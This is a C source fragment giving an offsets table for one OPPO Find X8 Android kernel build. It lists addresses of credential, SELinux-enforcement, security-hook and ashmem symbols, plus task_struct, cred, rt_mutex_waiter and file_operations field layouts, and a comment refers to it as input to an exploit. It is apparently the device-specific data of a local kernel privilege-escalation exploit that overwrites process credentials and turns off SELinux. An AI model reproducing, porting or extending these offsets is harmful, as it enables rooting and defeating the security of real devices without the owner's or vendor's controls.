/* OPPO Find X8 (findx8) — MT6991 / Dimensity 9400, kernel 6.6.118-android15 GKI
 * All offsets verified from BTF + kallsyms of the stock boot image.
 * uname -r: 6.6.118-android15-8-gebdfad32d749-ab15099304-4k
 */

OFFSETS_ENTRY("6.6.118-android15-8-gebdfad32d749-ab15099304-4k",
  .kimage_text_base=0xffffffc080000000ULL,
  .p0_page_offset=0xffffffc000000000ULL,
  .p0_phys_offset=0x40000000ULL,
  .p0_kernel_phys_load=0xC0000000ULL,
  .kernelsnitch_identity_start=0xffffffc000000000ULL,
  .kernelsnitch_identity_end=0xffffffc400000000ULL,
  .direct_map_end=0xffffffc400000000ULL,
  .off_init_task=0x0211E280, .off_init_cred=0x02130748, .off_init_uts_ns=0x022A3448,
  .off_empty_zero_page=0x0230F000, .off_root_task_group=0x02317580,
  .off_selinux_enforcing=0x02358EE0, .off_kptr_restrict=0x0211BCF8,
  .off_selinux_blob_sizes=0x0167AE90, .off_security_hook_heads=0x0167A758,
  .off_kmalloc_caches=0x0167A298, .off_anon_pipe_buf_ops=0x0116E848,
  .off_ashmem_misc_fops=0x0227C528, .off_ashmem_fops=0x012EF5C0,
  .off_ashmem_ioctl=0x00C8BC70, .off_ashmem_compat_ioctl=0x00C8C32C,
  .off_ashmem_mmap=0x00C8C380, .off_ashmem_open=0x00C8C5A0,
  .off_ashmem_release=0x00C8C628, .off_ashmem_show_fdinfo=0x00C8C6B4,
  .off_configfs_read_iter=0x004907EC, .off_configfs_bin_write_iter=0x004909F4,
  .off_copy_splice_read=0x004141BC, .off_noop_llseek=0x003C6F1C,
  .off_cap_capable_active=0,
  .off_slide_nfulnl_logger=0x02112260, .off_slide_loggers_0_1=0x021121B8,
  .off_slide_boot_id=0x02379ED8,

  /* task_struct (6.6 GKI, BTF verified) */
  .task_usage=0x40, .task_prio=0x84, .task_normal_prio=0x8C,
  .task_sched_task_group=0x348, .task_pi_lock=0x90C, .task_pi_waiters=0x920,
  .task_pi_top_task=0x930, .task_pi_blocked_on=0x938,
  .task_pid=0x618, .task_tgid=0x61C, .task_real_parent=0x628,
  .task_atomic_flags=0x5D8, .task_real_cred=0x818, .task_cred=0x820,
  .task_comm=0x830, .task_tasks=0x550, .task_seccomp=0x8E8,
  /* mm_struct owner is anonymous in this BTF; unused by exploit */
  .mm_owner=0,

  /* rt_mutex_waiter — 6.12-style layout (rt_waiter_node embedded) */
  .waiter_tree=0x00, .waiter_pi_tree=0x28, .waiter_task=0x50,
  .waiter_lock=0x58, .waiter_wake_state=0x60, .waiter_prio=0x18,
  .waiter_deadline=0x20, .waiter_ww_ctx=0x68,
  .waiter_pi_tree_prio=0x40, .waiter_pi_tree_deadline=0x48,

  .cred_uid=0x08, .cred_securebits=0x28, .cred_caps=0x30, .cred_security=0x80,

  /* file_operations (6.6 GKI, BTF verified) */
  .fops_owner=0x00, .fops_llseek=0x08, .fops_read=0x10, .fops_write=0x18,
  .fops_read_iter=0x20, .fops_write_iter=0x28, .fops_ioctl=0x48,
  .fops_compat_ioctl=0x50, .fops_mmap=0x58, .fops_open=0x68,
  .fops_release=0x78, .fops_splice_read=0xB8, .fops_show_fdinfo=0xD8,

  .mm_struct_sz=0x4C0,

  .pselect_waiter_word_shift=0,
  PSELECT_WORDS_6_12
),